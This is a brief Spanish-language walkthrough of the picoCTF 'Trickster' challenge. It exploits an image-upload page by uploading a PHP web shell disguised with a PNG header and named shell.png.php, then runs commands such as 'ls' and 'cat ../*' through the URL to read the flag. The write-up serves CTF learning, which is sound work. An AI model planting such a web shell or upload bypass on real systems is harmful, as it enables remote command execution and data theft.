## Trickster
I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:52500/)!

## Solucion
- Entramos a el archivo de robots.txt para inspeccionar si hay algun archivo oculto, en este caso encontramos la liga de intrucciones.txt. al leerlo nos dira una pista de como resolverlo.
- La variante que use fue crear un scriopt de php el cual es muy sencillo:
```
PNG
<?php system($_GET['cmd']);  
```
- Con este archivo creado, se subira a la pagina, ya arriba en la pagina podremos meternos al script y controlar todo a base de un cmd utilizandolo en la barra de busqueda de el navegador, por ejemplo asi ejecutamos un ls:
  http://atlas.picoctf.net:52500/uploads/shell.png.php?cmd=ls
- Al tener el cmd activo, podre mostrar los archivos ocultos guardados en la pagina y woala, tenemos flag:
  http://atlas.picoctf.net:52500/uploads/shell.png.php?cmd=cat%20../*
